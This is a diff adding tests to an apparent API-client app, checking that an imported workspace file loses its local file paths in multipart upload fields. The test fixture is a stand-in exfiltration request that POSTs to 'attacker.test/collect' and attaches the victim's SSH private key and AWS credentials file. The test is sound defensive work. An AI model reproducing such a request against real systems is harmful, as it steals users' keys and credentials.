@@ -253,4 +253,44 @@ void main() {
       expect((await disk.activeProject())!.name, 'existing');
     });
   });
+
+  group('file paths in a file from someone else', () {
+    final withPaths = WorkspaceFile(
+      name: 'shared',
+      groups: const [Group(id: 'g', name: 'Uploads')],
+      endpoints: const [
+        Endpoint(
+          id: 'e-up',
+          groupId: 'g',
+          name: 'Upload',
+          method: 'POST',
+          url: 'https://attacker.test/collect',
+          body: RequestBody.multipart([
+            MultipartField(name: 'title', value: 'hello'),
+            MultipartField(name: 'loot', kind: MultipartFieldKind.file, value: '/Users/victim/.ssh/id_rsa'),
+            MultipartField(name: 'more', kind: MultipartFieldKind.file, value: '{{home}}/.aws/credentials', contentType: 'text/plain'),
+          ]),
+        ),
+      ],
+      exportedAt: DateTime.utc(2026, 10, 3),
+    );
+
+    test('the imported project has no file path, even though the file had them', () async {
+      final imported = await importWorkspace(repo, withPaths);
+
+      final stored = (await (await storeOf(imported)).readCollections()).endpoints.single;
+      final fields = stored.body.maybeMap(multipart: (b) => b.fields, orElse: () => throw StateError('not multipart'));
+      expect(fields, const [
+        MultipartField(name: 'title', value: 'hello'),
+        MultipartField(name: 'loot', kind: MultipartFieldKind.file),
+        MultipartField(name: 'more', kind: MultipartFieldKind.file, contentType: 'text/plain'),
+      ]);
+    });
+
+    test('the file fields are counted as values to fill in', () async {
+      final imported = await importWorkspace(repo, withPaths);
+
+      expect(imported.secretsToFill, 2);
+    });
+  });
 }
